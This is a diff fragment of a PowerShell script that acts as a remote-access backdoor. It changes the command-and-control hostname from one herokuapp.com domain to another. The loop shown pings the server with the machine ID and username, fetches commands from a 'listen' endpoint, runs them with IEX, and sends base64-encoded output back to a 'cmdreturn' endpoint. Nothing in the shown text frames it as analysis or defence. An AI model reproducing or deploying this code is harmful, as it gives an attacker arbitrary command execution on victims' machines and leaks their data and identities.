@@ -26,8 +26,8 @@ $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandP
 $wshell = New-Object -ComObject wscript.shell;
 while (1) 
 {
-(New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/ping/" + $id + "/" + $username)
-$s = (New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/listen/" + $id);
+(New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/ping/" + $id + "/" + $username)
+$s = (New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/listen/" + $id);
 if ($s -ne $ps) 
 {
 if ([string]::IsNullOrEmpty($s) -eq 0) {
@@ -38,7 +38,7 @@ exit
 $out = IEX $s;
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($out)
 $encoded = [Convert]::ToBase64String($Bytes)
-(New-Object System.Net.WebClient).DownloadString("http://twobii.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
+(New-Object System.Net.WebClient).DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
 $ps = $s;
 }
 }
